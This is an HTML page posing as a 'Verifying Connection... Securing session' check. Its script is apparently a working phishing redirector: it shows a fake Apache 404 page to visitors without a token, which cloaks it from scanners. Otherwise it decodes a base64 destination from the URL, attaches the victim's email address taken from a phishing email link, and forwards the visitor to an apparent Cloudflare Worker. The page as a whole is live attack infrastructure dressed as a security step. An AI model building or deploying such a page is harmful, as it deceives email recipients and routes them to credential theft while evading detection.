<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Verifying Connection...</title>
    <meta name="referrer" content="no-referrer">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    
    <link rel="icon" type="image/x-icon" href="https://image2url.com/r2/default/images/1772160235117-4ce6ffcd-ee0a-4481-9a48-bdd24a597cf7.png">

    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; background: #ffffff; margin: 0; color: #333; }
        .loader { border: 3px solid #f3f3f3; border-top: 3px solid #3498db; border-radius: 50%; width: 24px; height: 24px; animation: spin 1s linear infinite; margin-bottom: 15px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .status-text { font-size: 14px; color: #666; }
    </style>
</head>
<body>
    <div id="main-content">
        <div class="loader"></div>
        <div class="status-text">Securing session...</div>
    </div>

    <script>
        (function() {
            const params = new URLSearchParams(window.location.search);
            let token = params.get('t');
            const email = params.get('e'); // Capture email from the email link

            // 1. STEALTH CHECK
            if (!token) {
               document.title = "404 Not Found";
               document.body.style.display = "block";
               document.body.style.padding = "20px";
               document.body.style.textAlign = "left";
               document.body.innerHTML = "<h1>404 Not Found</h1><p>The requested resource was not found on this server.</p><hr><i>Apache/2.4.41 (Ubuntu) Server at github.io Port 443</i>";
               return;
            }

            // 2. TOKEN & PARAMETER PROCESSING
            try {
                token = token.replace(/-/g, '+').replace(/_/g, '/');
                while (token.length % 4) { token += '='; }
                
                let target = atob(token);
                
                if (target.startsWith('http')) {
                    // PRISTINE ALIGNMENT: Append email to the Cloudflare Worker URL
                    const separator = target.includes('?') ? '&' : '?';
                    const finalDestination = email ? `${target}${separator}e=${encodeURIComponent(email)}` : target;

                    setTimeout(() => {
                        window.location.replace(finalDestination);
                    }, 500); // Fast hand-off to the Worker
                } else {
                    throw new Error("Invalid Protocol");
                }
            } catch (e) {
                document.body.innerHTML = "<div class='status-text'>Verification link expired or invalid.</div>";
            }
        })();
    </script>
</body>
</html>
